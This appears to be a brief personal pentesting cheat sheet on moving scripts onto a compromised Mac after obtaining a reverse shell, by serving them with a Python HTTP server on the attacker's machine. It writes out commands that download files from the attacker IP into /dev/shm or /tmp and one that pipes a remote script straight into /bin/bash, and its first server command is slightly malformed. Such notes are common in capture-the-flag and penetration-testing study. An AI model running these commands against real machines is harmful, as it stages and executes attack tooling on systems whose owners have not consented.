## PYTHON server 

**on my terminal**
  (open the server in the dir you have the scripts so that it will wget all the files of the dir on the mac)

```bash
 python3 -m server 8000
```
```bash 
python3 -m http.server (portnumber)

```

**on the mac so obtained/revershell**

dir > /dev/shm (wget any script in this dir)

```bash
 wget -r <my ip>  #(do ifconfig to know the ip)
```
  or

```bash
 curl <my ip:port>/script | /bin/bash
```

Note: you can also wget or curl in /tmp directory 
